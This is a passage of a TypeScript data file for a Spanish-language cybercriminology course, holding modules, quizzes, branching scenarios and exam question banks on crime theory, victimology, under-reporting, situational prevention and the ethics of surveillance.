                text: "En el colegio otros estudiantes empiezan a hablar del caso. ¿Qué hace la institución?",
                choices: [
                  { text: "Protege la identidad de Andrés, frena la difusión y ofrece acompañamiento psicológico.", next: 'fin', points: 20, feedback: "Excelente: evita la revictimización en su entorno." },
                  { text: "Usa el caso con nombre propio en una charla de prevención.", next: 'fin', points: -10, feedback: "Exponerlo lo revictimiza; los casos se usan anonimizados." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'cri_prevention',
        title: "6. Prevención Situacional del Delito",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "La prevención situacional (Clarke) no busca cambiar a los delincuentes sino las situaciones. Sus técnicas se agrupan en cinco estrategias: aumentar el esfuerzo, aumentar el riesgo, reducir la recompensa, reducir las provocaciones y eliminar las excusas." },
          {
            type: 'flashcards',
            title: 'Las 5 estrategias aplicadas al ciberespacio',
            cards: [
              { front: 'Aumentar el esfuerzo', back: 'Doble factor, contraseñas robustas, cifrado: robar una cuenta cuesta más.' },
              { front: 'Aumentar el riesgo', back: 'Registro de actividad, alertas, monitoreo y colaboración con autoridades: más probabilidad de ser detectado.' },
              { front: 'Reducir la recompensa', back: 'Cifrar los datos (robarlos sirve de poco), límites a transferencias nuevas, bloqueo rápido de tarjetas.' },
              { front: 'Reducir las provocaciones', back: 'Moderar comunidades, evitar exhibir públicamente vulnerabilidades o datos sensibles.' },
              { front: 'Eliminar las excusas', back: 'Avisos claros ("el acceso no autorizado es delito"), términos de uso y campañas que muestran el daño real.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Una cooperativa limita las transferencias a cuentas nuevas durante las primeras 24 horas. ¿Qué estrategia aplica?",
              options: ["Reducir la recompensa.", "Reducir las provocaciones.", "Eliminar las excusas."],
              correctOptionIndex: 0,
              feedback: {
                correct: "Correcto: aunque el delincuente robe el acceso, obtiene menos (o nada) en la ventana en que suele actuar.",
                incorrect: "Limitar lo que se puede sacar reduce la recompensa del delito."
              }
            }
          },
        ]
      },
      {
        id: 'cri_exam',
        title: "7. 📝 Examen del Nivel Intermedio",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "El examen toma 10 preguntas al azar de un banco de 14 y se aprueba con 70%. Al aprobarlo obtendrá el badge de Analista en Cibercriminología · Nivel Intermedio." },
          {
            type: 'exam',
            title: 'Examen: Analista en Cibercriminología · Intermedio',
            description: 'Evalúa teorías criminológicas, neutralización, victimología y prevención situacional.',
            passPercent: 70,
            questionsPerAttempt: 10,
            questions: [
              { question: 'Según la teoría de las actividades rutinarias, ¿qué tres elementos coinciden en un delito?', options: [{ id: 'q1a', text: 'Delincuente motivado, objetivo adecuado y ausencia de guardián capaz.', isCorrect: true, score: 10 }, { id: 'q1b', text: 'Arma, motivo y coartada.', isCorrect: false, score: 0 }, { id: 'q1c', text: 'Víctima, testigo y juez.', isCorrect: false, score: 0 }], feedback: 'Cohen y Felson, 1979.' },
              { question: 'En línea, ¿qué puede funcionar como "guardián capaz"?', options: [{ id: 'q2a', text: 'El doble factor, un antivirus, un moderador o una alerta del banco.', isCorrect: true, score: 10 }, { id: 'q2b', text: 'Solo un policía presente.', isCorrect: false, score: 0 }, { id: 'q2c', text: 'Nada.', isCorrect: false, score: 0 }], feedback: 'El guardián puede ser tecnológico o social.' },
              { question: '¿Qué plantea la teoría de la elección racional?', options: [{ id: 'q3a', text: 'Que el delincuente sopesa costos, beneficios y riesgos.', isCorrect: true, score: 10 }, { id: 'q3b', text: 'Que el delito es siempre impulsivo.', isCorrect: false, score: 0 }, { id: 'q3c', text: 'Que el delito se hereda.', isCorrect: false, score: 0 }], feedback: 'Base de la prevención situacional.' },
              { question: 'La teoría del aprendizaje social explica el cibercrimen porque…', options: [{ id: 'q4a', text: 'Las técnicas y justificaciones se aprenden de otros, también en foros.', isCorrect: true, score: 10 }, { id: 'q4b', text: 'Todos nacen sabiendo programar.', isCorrect: false, score: 0 }, { id: 'q4c', text: 'Nadie aprende de nadie.', isCorrect: false, score: 0 }], feedback: 'Akers.' },
              { question: '¿Qué teoría fue formulada específicamente para el cibercrimen?', options: [{ id: 'q5a', text: 'La del espacio transicional (Jaishankar).', isCorrect: true, score: 10 }, { id: 'q5b', text: 'La de las actividades rutinarias.', isCorrect: false, score: 0 }, { id: 'q5c', text: 'La del autocontrol.', isCorrect: false, score: 0 }], feedback: 'Las demás se adaptaron al ciberespacio.' },
              { question: '"Nadie salió perjudicado, el banco tiene seguro." ¿Qué técnica de neutralización es?', options: [{ id: 'q6a', text: 'Negación del daño.', isCorrect: true, score: 10 }, { id: 'q6b', text: 'Negación de la víctima.', isCorrect: false, score: 0 }, { id: 'q6c', text: 'Lealtades superiores.', isCorrect: false, score: 0 }], feedback: 'Minimiza el perjuicio.' },
              { question: '"Esa empresa se lo merecía." ¿Qué técnica es?', options: [{ id: 'q7a', text: 'Negación de la víctima.', isCorrect: true, score: 10 }, { id: 'q7b', text: 'Negación de la responsabilidad.', isCorrect: false, score: 0 }, { id: 'q7c', text: 'Condena de los condenadores.', isCorrect: false, score: 0 }], feedback: 'Convierte a la víctima en culpable.' },
              { question: '"Yo solo vendo los datos, lo que haga el comprador no es mi problema." ¿Qué técnica es?', options: [{ id: 'q8a', text: 'Negación de la responsabilidad.', isCorrect: true, score: 10 }, { id: 'q8b', text: 'Negación del daño.', isCorrect: false, score: 0 }, { id: 'q8c', text: 'Lealtades superiores.', isCorrect: false, score: 0 }], feedback: 'Atribuye el daño a otro.' },
              { question: '¿Qué es revictimizar?', options: [{ id: 'q9a', text: 'Dañar de nuevo a la víctima, por ejemplo culpándola o exponiendo su caso.', isCorrect: true, score: 10 }, { id: 'q9b', text: 'Denunciar el delito.', isCorrect: false, score: 0 }, { id: 'q9c', text: 'Preservar la evidencia.', isCorrect: false, score: 0 }], feedback: 'La atención debe creer, orientar y proteger.' },
              { question: 'Una víctima de sextorsión pregunta si debe pagar. ¿Qué se recomienda?', options: [{ id: 'q10a', text: 'No pagar, no borrar la conversación, preservarla, bloquear y denunciar.', isCorrect: true, score: 10 }, { id: 'q10b', text: 'Pagar para terminar rápido.', isCorrect: false, score: 0 }, { id: 'q10c', text: 'Borrar todo y olvidarlo.', isCorrect: false, score: 0 }], feedback: 'Pagar suele traer más exigencias.' },
              { question: 'Si la víctima es menor de edad, ¿qué se activa?', options: [{ id: 'q11a', text: 'La ruta de protección, el aviso a su familia y la denuncia.', isCorrect: true, score: 10 }, { id: 'q11b', text: 'Nada, se maneja en secreto.', isCorrect: false, score: 0 }, { id: 'q11c', text: 'Una sanción al menor.', isCorrect: false, score: 0 }], feedback: 'La protección del menor es prioritaria.' },
              { question: 'El doble factor, en la prevención situacional, sirve para…', options: [{ id: 'q12a', text: 'Aumentar el esfuerzo.', isCorrect: true, score: 10 }, { id: 'q12b', text: 'Reducir las provocaciones.', isCorrect: false, score: 0 }, { id: 'q12c', text: 'Eliminar las excusas.', isCorrect: false, score: 0 }], feedback: 'Robar la cuenta cuesta más.' },
              { question: 'Un aviso que dice "el acceso no autorizado es delito" busca…', options: [{ id: 'q13a', text: 'Eliminar las excusas.', isCorrect: true, score: 10 }, { id: 'q13b', text: 'Reducir la recompensa.', isCorrect: false, score: 0 }, { id: 'q13c', text: 'Aumentar el esfuerzo.', isCorrect: false, score: 0 }], feedback: 'Nadie puede decir que no sabía.' },
              { question: '¿Por qué muchas víctimas de fraude en línea no denuncian?', options: [{ id: 'q14a', text: 'Por vergüenza, culpa o porque creen que no servirá.', isCorrect: true, score: 10 }, { id: 'q14b', text: 'Porque no hay delitos en línea.', isCorrect: false, score: 0 }, { id: 'q14c', text: 'Porque denunciar es ilegal.', isCorrect: false, score: 0 }], feedback: 'Esto genera una gran cifra negra.' },
            ],
          },
        ]
      },
    ]
  },
  cybercriminology_avanzado: {
    title: "Analista en Cibercriminología · Nivel Avanzado",
    description: "Economía del cibercrimen, métodos de investigación y cifra negra, trayectorias e intervención temprana, prevención basada en evidencia, desplazamiento del delito y un informe criminológico integrador. Examen con nota mínima del 80%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'cra_intro',
        title: "1. 🎯 Nivel Avanzado: del Análisis a la Política",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "En este nivel estudiará el cibercrimen como fenómeno social: cómo se organiza, cómo medirlo cuando la mayoría de los casos no se denuncian, por qué caminos llegan las personas a delinquir y cómo diseñar y evaluar políticas de prevención." },
          { type: 'text', icon: 'AlarmIcon', text: "El examen final toma 12 preguntas al azar de un banco de 16 y exige 80%. Al aprobarlo obtendrá el badge de Analista en Cibercriminología · Nivel Avanzado." },
        ]
      },
      {
        id: 'cra_economy',
        title: "2. La Economía del Cibercrimen",
        content: [
          { type: 'text', icon: 'BrokenEnvelopeIcon', text: "El cibercrimen actual funciona como una economía especializada: distintos actores cumplen funciones distintas y se necesitan entre sí. Para la criminología esto importa porque cada función es un punto de intervención: desarticular a quienes lavan el dinero o reclutan mulas afecta a toda la cadena." },
          { type: 'text', icon: 'LockIcon', text: "Entre delincuentes no hay contratos ni tribunales, así que la confianza es frágil. Los estudios muestran que estos entornos dependen de la reputación y de intermediarios; por eso las operaciones policiales que siembran desconfianza (por ejemplo, revelando que un mercado estaba infiltrado) pueden tener efectos más duraderos que un cierre." },
          {
            type: 'interactive',
            title: 'Funciones dentro del ecosistema (visión criminológica)',
            items: [
              { term: 'Desarrolladores', definition: 'Crean las herramientas maliciosas. Suelen ser pocos y especializados.' },
              { term: 'Operadores o afiliados', definition: 'Usan esas herramientas contra las víctimas, a menudo a cambio de un porcentaje de lo obtenido.' },
              { term: 'Intermediarios', definition: 'Conectan a las partes y administran la confianza entre ellas.' },
              { term: 'Mulas y lavado', definition: 'Mueven y "enfrían" el dinero. Muchas mulas son personas reclutadas con engaños, que también terminan siendo víctimas.' },
              { term: 'Reclutadores', definition: 'Atraen a jóvenes o personas en situación vulnerable con promesas de dinero fácil.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Desde la criminología, ¿por qué es útil ver el cibercrimen como una economía de funciones especializadas?",
              options: [
                "Porque muestra que es imposible de combatir.",
                "Porque cada función es un punto de intervención: afectar a los intermediarios, el lavado o el reclutamiento puede debilitar toda la cadena.",
                "Porque así se puede calcular el salario de los delincuentes."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: entender la división del trabajo ayuda a elegir dónde intervenir con mayor impacto.",
                incorrect: "La utilidad está en identificar puntos de intervención que debiliten toda la cadena."
              }
            }
          },
        ]
      },
      {
        id: 'cra_methods',
        title: "3. 🚩 Medir el Cibercrimen: Datos y Cifra Negra",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Las denuncias muestran solo una parte del fenómeno: la cifra negra es todo lo que ocurre y nunca se registra. Por eso la cibercriminología combina fuentes: registros oficiales, encuestas de victimización, datos de empresas y estudios cualitativos." },
          { type: 'text', icon: 'LockIcon', text: "Investigar personas exige ética: consentimiento informado, protección de identidades, no engañar sin aprobación de un comité de ética y cuidado al estudiar comunidades en línea." },
          {
            type: 'challenge',
            title: 'Interprete los datos de una ciudad',
            brief: "Datos ficticios de denuncias y de una encuesta de victimización en una ciudad. Interprételos.",
            artifacts: [
              {
                name: 'datos_ciudad.txt',
                content: `DENUNCIAS POR DELITOS INFORMÁTICOS
                       2025     2026
Fraude en línea        2.000    2.600
Suplantación           1.000    1.100
Sextorsión               100      100

ENCUESTA DE VICTIMIZACIÓN 2026 (muestra representativa)
Personas que dicen haber sido víctimas de fraude en línea en el último año: 20.000
De ellas, cuántas denunciaron: 13 %`,
              },
            ],
            questions: [
              { prompt: '¿En qué porcentaje aumentaron las denuncias de fraude en línea entre 2025 y 2026? (número entero)', answers: ['30', '30%'], explanation: 'De 2.000 a 2.600: un aumento del 30 %. Ojo: más denuncias puede significar más delitos o más confianza para denunciar.' },
              { prompt: 'Según la encuesta, ¿qué porcentaje de víctimas de fraude NO denunció? (número entero)', answers: ['87', '87%'], explanation: 'Si denunció el 13 %, no denunció el 87 %: esa es la cifra negra.' },
              { prompt: 'Las denuncias de sextorsión no cambiaron. ¿Prueba eso que el delito no creció? (sí/no)', answers: ['no'], explanation: 'No: la sextorsión tiene una cifra negra muy alta por vergüenza y miedo. Las denuncias estables no prueban nada sobre la incidencia real.' },
            ],
          },
        ]
      },
      {
        id: 'cra_pathways',
        title: "4. Trayectorias e Intervención Temprana",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "Muchas personas no llegan al cibercrimen de golpe: los estudios describen trayectorias graduales, a veces desde comunidades de videojuegos o foros, donde la curiosidad técnica, el reconocimiento entre pares y el dinero fácil empujan poco a poco hacia conductas ilegales." },
          { type: 'text', icon: 'HappyUsersIcon', text: "Por eso existen programas de intervención temprana que redirigen a jóvenes con talento técnico hacia caminos legales: formación, competencias de ciberseguridad y empleo. Un ejemplo conocido es el programa Cyber Choices de la Agencia Nacional contra el Crimen del Reino Unido." },
          {
            type: 'scenario',
            title: 'Caso 1: el joven con talento',
            intro: "Un joven ficticio de 16 años fue identificado usando herramientas para tumbar los servidores de juego de otros jugadores. No tiene antecedentes. Usted asesora la respuesta. Necesita 40 de 60 puntos.",
            start: 'j1',
            maxPoints: 60,
            passPoints: 40,
            steps: {
              j1: {
                text: "¿Qué enfoque recomienda como punto de partida?",
                choices: [
                  { text: "Una intervención que le muestre las consecuencias legales y el daño causado, junto con caminos legales para su talento técnico, con participación de su familia.", next: 'j2', points: 20, feedback: "Correcto: intervenir temprano y redirigir el talento reduce la probabilidad de escalar." },
                  { text: "La sanción más dura posible para dar ejemplo.", next: 'j2', points: 0, feedback: "Con un joven sin antecedentes, la sanción aislada puede empujarlo más hacia esas comunidades." },
                ]
              },
              j2: {
                text: "¿Qué factor de su trayectoria conviene abordar?",
                choices: [
                  { text: "El reconocimiento que obtenía de su grupo: ofrecerle espacios legales donde ese talento también se reconozca, como competencias de ciberseguridad.", next: 'j3', points: 20, feedback: "Bien: se reemplaza la recompensa social que lo motivaba." },
                  { text: "Prohibirle usar computadores para siempre.", next: 'j3', points: -10, feedback: "Poco realista y contraproducente: cierra el camino legal de su talento." },
                ]
              },
              j3: {
                text: "¿Cómo sabría si la intervención funcionó?",
                choices: [
                  { text: "Con seguimiento en el tiempo: si no reincide y si participa en actividades legales relacionadas con su interés.", next: 'fin', points: 20, feedback: "Correcto: una política se evalúa por sus resultados, no por sus intenciones." },
                  { text: "Si él dice que aprendió la lección.", next: 'fin', points: 0, feedback: "La declaración no es un indicador confiable de resultado." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'cra_policy',
        title: "5. Prevención Basada en Evidencia y Desplazamiento",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "Una campaña de prevención no se evalúa por cuántas personas la vieron, sino por si cambió conductas o redujo victimización. Los mensajes que solo asustan suelen funcionar peor que los que dicen exactamente qué hacer (por ejemplo: \"tu banco nunca te pedirá un código por teléfono: cuelga y llama tú\")." },
          { type: 'text', icon: 'ServerIcon', text: "Cuando se bloquea un delito, puede desplazarse: a otro momento, a otro lugar o plataforma, a otra táctica, a otro objetivo o a otro tipo de delito. Pero la investigación también muestra lo contrario, la difusión de beneficios: la protección de un objetivo a veces reduce el delito en objetivos cercanos." },
          {
            type: 'memory',
            title: 'Tipos de desplazamiento',
            pairs: [
              { term: 'Desplazamiento táctico', definition: 'Del SMS falso a la llamada falsa.' },
              { term: 'Desplazamiento de objetivo', definition: 'Del banco grande protegido a la cooperativa pequeña.' },
              { term: 'Desplazamiento de plataforma', definition: 'Del foro cerrado a una aplicación de mensajería.' },
              { term: 'Difusión de beneficios', definition: 'Proteger un objetivo reduce el delito también en otros cercanos.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Tras una campaña contra el fraude por SMS, bajan esos casos pero suben los fraudes por llamada telefónica. ¿Cómo se interpreta?",
              options: [
                "La campaña fracasó por completo.",
                "Hubo desplazamiento táctico: hay que extender la prevención a la nueva táctica y medir el efecto neto.",
                "Es una coincidencia sin relación."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: el desplazamiento es esperable; se mide el efecto neto y se adapta la prevención.",
                incorrect: "Es un desplazamiento táctico: se mide el efecto total y se adapta la estrategia."
              }
            }
          },
        ]
      },
      {
        id: 'cra_ethics',
        title: "6. Ética y Derechos en la Respuesta al Cibercrimen",
        content: [
          { type: 'text', icon: 'LockIcon', text: "Responder al cibercrimen implica tensiones: vigilancia frente a privacidad, prevención frente a estigmatización, eficacia frente a debido proceso. La criminología crítica recuerda que las políticas también pueden causar daño, por ejemplo cuando estigmatizan a grupos enteros o recogen más datos de los necesarios." },
          {
            type: 'scenario',
            title: 'Caso 2: la propuesta de monitoreo',
            intro: "Una entidad ficticia propone monitorear todos los chats de sus usuarios jóvenes para detectar sextorsión. Usted debe emitir un concepto. Necesita 40 de 60 puntos.",
            start: 'e1',
            maxPoints: 60,
            passPoints: 40,
            steps: {
              e1: {
                text: "¿Qué evalúa primero?",
                choices: [
                  { text: "Si la medida es necesaria y proporcional: si hay alternativas menos invasivas, qué datos se recogerían y con qué base legal.", next: 'e2', points: 20, feedback: "Correcto: necesidad y proporcionalidad son el punto de partida." },
                  { text: "Solo si la tecnología funciona.", next: 'e2', points: 0, feedback: "La eficacia técnica no basta: también deben respetarse los derechos." },
                ]
              },
              e2: {
                text: "¿Qué alternativa menos invasiva propone?",
                choices: [
                  { text: "Educación a jóvenes y familias, canales de reporte fáciles y confidenciales, y herramientas que el propio usuario controle para bloquear y reportar.", next: 'e3', points: 20, feedback: "Bien: protege sin vigilancia masiva." },
                  { text: "Ninguna: hay que leer todo.", next: 'e3', points: -10, feedback: "La vigilancia masiva sin necesidad demostrada vulnera la privacidad (Ley 1581 y derechos fundamentales)." },
                ]
              },
              e3: {
                text: "¿Qué garantía exige si se adopta alguna medida técnica?",
                choices: [
                  { text: "Minimizar los datos, limitar quién accede y por cuánto tiempo, informar a los usuarios y evaluar periódicamente si la medida sigue siendo necesaria.", next: 'fin', points: 20, feedback: "Excelente: garantías proporcionales y revisión." },
                  { text: "Ninguna: si es por seguridad, todo vale.", next: 'fin', points: -10, feedback: "La seguridad no anula los derechos; las garantías son obligatorias." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'cra_capstone',
        title: "7. 🧩 Caso Integrador: el Informe Criminológico",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Caso final: la alcaldía de una ciudad ficticia le pide un informe sobre el aumento de fraudes contra adultos mayores y una propuesta de prevención. Integre teoría, datos, victimología, prevención y ética." },
          {
            type: 'scenario',
            title: 'Caso integrador: fraudes contra adultos mayores',
            intro: "Debe entregar un diagnóstico y una propuesta a la alcaldía. Necesita 80 de 100 puntos.",
            start: 'i1',
            maxPoints: 100,
            passPoints: 80,
            steps: {
              i1: {
                text: "¿Con qué datos empieza el diagnóstico?",
                choices: [
                  { text: "Denuncias, más una encuesta de victimización o datos de entidades financieras, porque las denuncias subestiman el fenómeno.", next: 'i2', points: 20, feedback: "Correcto: combinar fuentes reduce el sesgo de la cifra negra." },
                  { text: "Solo las denuncias oficiales.", next: 'i2', points: 0, feedback: "Subestimaría el fenómeno, sobre todo en una población que denuncia poco." },
                ]
              },
              i2: {
                text: "¿Qué teoría usa para estructurar el análisis?",
                choices: [
                  { text: "Actividades rutinarias: objetivo adecuado (ahorros, menor familiaridad digital), delincuentes motivados y falta de guardianes (alertas, familia, conocimiento).", next: 'i3', points: 20, feedback: "Bien: orienta directamente a dónde intervenir." },
                  { text: "Ninguna: basta con describir los casos.", next: 'i3', points: 0, feedback: "Sin teoría, el informe describe pero no explica ni orienta." },
                ]
              },
              i3: {
                text: "¿Cómo se presenta a las víctimas en el informe?",
                choices: [
                  { text: "Sin culpabilizarlas: como personas a las que les faltaron guardianes, con propuestas de apoyo y de canales de denuncia accesibles.", next: 'i4', points: 20, feedback: "Correcto: evita la revictimización y fomenta la denuncia." },
                  { text: "Como personas ingenuas que no se cuidan.", next: 'i4', points: -10, feedback: "Culpabilizar reduce la denuncia y la confianza." },
                ]
              },
              i4: {
                text: "¿Qué propuesta de prevención prioriza?",
                choices: [
                  { text: "Alertas y límites en las entidades financieras, mensajes concretos para adultos mayores y sus familias, y una línea de orientación, con indicadores para evaluar el efecto.", next: 'i5', points: 20, feedback: "Excelente: refuerza guardianes, da instrucciones claras y es medible." },
                  { text: "Una campaña con mensajes de miedo en televisión.", next: 'i5', points: 0, feedback: "Los mensajes que solo asustan suelen cambiar poco las conductas." },
                ]
              },
              i5: {
                text: "¿Qué advierte sobre los posibles efectos?",
                choices: [
                  { text: "Que puede haber desplazamiento hacia otras tácticas o víctimas, por lo que se medirá el efecto neto y se ajustará la estrategia.", next: 'fin', points: 20, feedback: "Correcto: una propuesta madura anticipa el desplazamiento." },
                  { text: "Que el problema desaparecerá por completo.", next: 'fin', points: 0, feedback: "Prometer eliminar el fenómeno no es realista." },
                ]
              },
              fin: { text: "Fin del caso integrador. Si aprobó, está listo para el examen final." },
            }
          },
        ]
      },
      {
        id: 'cra_exam',
        title: "8. 📝 Examen del Nivel Avanzado",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Examen final de la ruta Analista en Cibercriminología: 12 preguntas al azar de un banco de 16, con 80% para aprobar." },
          {
            type: 'exam',
            title: 'Examen: Analista en Cibercriminología · Avanzado',
            description: 'Evalúa economía del cibercrimen, medición y cifra negra, trayectorias, prevención basada en evidencia, desplazamiento y ética.',
            passPercent: 80,
            questionsPerAttempt: 12,
            questions: [
              { question: '¿Por qué es útil ver el cibercrimen como una economía de funciones especializadas?', options: [{ id: 'w1a', text: 'Porque cada función es un punto de intervención.', isCorrect: true, score: 10 }, { id: 'w1b', text: 'Porque lo hace imposible de combatir.', isCorrect: false, score: 0 }, { id: 'w1c', text: 'No es útil.', isCorrect: false, score: 0 }], feedback: 'Permite elegir dónde intervenir.' },
              { question: 'En entornos delictivos en línea, ¿qué sostiene la confianza entre las partes?', options: [{ id: 'w2a', text: 'La reputación y los intermediarios.', isCorrect: true, score: 10 }, { id: 'w2b', text: 'Los contratos y tribunales.', isCorrect: false, score: 0 }, { id: 'w2c', text: 'Nada.', isCorrect: false, score: 0 }], feedback: 'Por eso sembrar desconfianza los debilita.' },
              { question: '¿Qué es la cifra negra?', options: [{ id: 'w3a', text: 'Los delitos que ocurren pero nunca se registran.', isCorrect: true, score: 10 }, { id: 'w3b', text: 'El dinero robado.', isCorrect: false, score: 0 }, { id: 'w3c', text: 'Los delitos resueltos.', isCorrect: false, score: 0 }], feedback: 'Las denuncias son solo una parte.' },
              { question: 'Si el 13 % de las víctimas denuncia, ¿qué porcentaje queda en la cifra negra?', options: [{ id: 'w4a', text: '87 %.', isCorrect: true, score: 10 }, { id: 'w4b', text: '13 %.', isCorrect: false, score: 0 }, { id: 'w4c', text: '50 %.', isCorrect: false, score: 0 }], feedback: '100 − 13 = 87.' },
              { question: 'Las denuncias de un delito aumentan un 30 %. ¿Qué se puede concluir con certeza?', options: [{ id: 'w5a', text: 'Que hay más denuncias; puede deberse a más delitos o a más confianza para denunciar.', isCorrect: true, score: 10 }, { id: 'w5b', text: 'Que el delito aumentó exactamente un 30 %.', isCorrect: false, score: 0 }, { id: 'w5c', text: 'Que la policía trabaja peor.', isCorrect: false, score: 0 }], feedback: 'Las denuncias reflejan también la disposición a denunciar.' },
              { question: '¿Qué fuente complementa las denuncias para medir la victimización?', options: [{ id: 'w6a', text: 'Las encuestas de victimización.', isCorrect: true, score: 10 }, { id: 'w6b', text: 'Las redes sociales del delincuente.', isCorrect: false, score: 0 }, { id: 'w6c', text: 'Ninguna.', isCorrect: false, score: 0 }], feedback: 'Capturan casos no denunciados.' },
              { question: '¿Qué exige la ética al investigar a personas en comunidades en línea?', options: [{ id: 'w7a', text: 'Consentimiento, protección de identidades y aprobación de un comité de ética si hay engaño.', isCorrect: true, score: 10 }, { id: 'w7b', text: 'Nada, porque es público.', isCorrect: false, score: 0 }, { id: 'w7c', text: 'Publicar los nombres.', isCorrect: false, score: 0 }], feedback: 'Los participantes tienen derechos.' },
              { question: '¿Qué buscan los programas de intervención temprana con jóvenes con talento técnico?', options: [{ id: 'w8a', text: 'Redirigir ese talento hacia caminos legales.', isCorrect: true, score: 10 }, { id: 'w8b', text: 'Prohibirles usar tecnología.', isCorrect: false, score: 0 }, { id: 'w8c', text: 'Sancionarlos siempre al máximo.', isCorrect: false, score: 0 }], feedback: 'Ejemplo: Cyber Choices en el Reino Unido.' },
              { question: '¿Cómo se evalúa una política de prevención?', options: [{ id: 'w9a', text: 'Por sus resultados: cambios de conducta o reducción de la victimización.', isCorrect: true, score: 10 }, { id: 'w9b', text: 'Por cuántas personas vieron la campaña.', isCorrect: false, score: 0 }, { id: 'w9c', text: 'Por su presupuesto.', isCorrect: false, score: 0 }], feedback: 'Alcance no es impacto.' },
              { question: '¿Qué tipo de mensaje de prevención suele funcionar mejor?', options: [{ id: 'w10a', text: 'Uno que dice exactamente qué hacer.', isCorrect: true, score: 10 }, { id: 'w10b', text: 'Uno que solo genera miedo.', isCorrect: false, score: 0 }, { id: 'w10c', text: 'Uno muy técnico.', isCorrect: false, score: 0 }], feedback: 'Por ejemplo: "cuelga y llama tú al banco".' },
              { question: 'Tras bloquear el fraude por SMS, sube el fraude por llamada. ¿Qué tipo de desplazamiento es?', options: [{ id: 'w11a', text: 'Táctico.', isCorrect: true, score: 10 }, { id: 'w11b', text: 'De objetivo.', isCorrect: false, score: 0 }, { id: 'w11c', text: 'Temporal.', isCorrect: false, score: 0 }], feedback: 'Cambió la táctica, no el objetivo.' },
              { question: '¿Qué es la difusión de beneficios?', options: [{ id: 'w12a', text: 'Que proteger un objetivo reduce el delito también en otros cercanos.', isCorrect: true, score: 10 }, { id: 'w12b', text: 'Que el delito se mueve a otro lugar.', isCorrect: false, score: 0 }, { id: 'w12c', text: 'Que los delincuentes comparten ganancias.', isCorrect: false, score: 0 }], feedback: 'Es lo opuesto al desplazamiento.' },
              { question: 'Ante una propuesta de vigilancia masiva para prevenir un delito, ¿qué se evalúa primero?', options: [{ id: 'w13a', text: 'Necesidad y proporcionalidad, y si hay alternativas menos invasivas.', isCorrect: true, score: 10 }, { id: 'w13b', text: 'Solo si la tecnología funciona.', isCorrect: false, score: 0 }, { id: 'w13c', text: 'Nada: la seguridad justifica todo.', isCorrect: false, score: 0 }], feedback: 'La seguridad no anula los derechos.' },
              { question: '¿Qué riesgo tiene culpabilizar a las víctimas en un informe?', options: [{ id: 'w14a', text: 'Reduce la denuncia y revictimiza.', isCorrect: true, score: 10 }, { id: 'w14b', text: 'Ninguno.', isCorrect: false, score: 0 }, { id: 'w14c', text: 'Aumenta la denuncia.', isCorrect: false, score: 0 }], feedback: 'La cifra negra crece.' },
              { question: 'En un informe criminológico, ¿para qué sirve una teoría?', options: [{ id: 'w15a', text: 'Para explicar el fenómeno y orientar dónde intervenir.', isCorrect: true, score: 10 }, { id: 'w15b', text: 'Para alargar el texto.', isCorrect: false, score: 0 }, { id: 'w15c', text: 'No sirve.', isCorrect: false, score: 0 }], feedback: 'Sin teoría, solo se describe.' },
              { question: 'Una propuesta de prevención madura debe advertir…', options: [{ id: 'w16a', text: 'El posible desplazamiento, y cómo se medirá el efecto neto.', isCorrect: true, score: 10 }, { id: 'w16b', text: 'Que el delito desaparecerá.', isCorrect: false, score: 0 }, { id: 'w16c', text: 'Nada.', isCorrect: false, score: 0 }], feedback: 'Anticipar efectos es parte del diseño.' },
            ],
          },
        ]
      },
    ]
  }
};


// This function simulates fetching data from an API.
// It uses a timeout to mimic network latency.
export const fetchLearningPaths = (): Promise<LearningPaths> => {
  return new Promise(resolve => {
    setTimeout(() => {
      resolve(LEARNING_PATHS_DATA);
    }, 1000); // 1 second delay
  });
};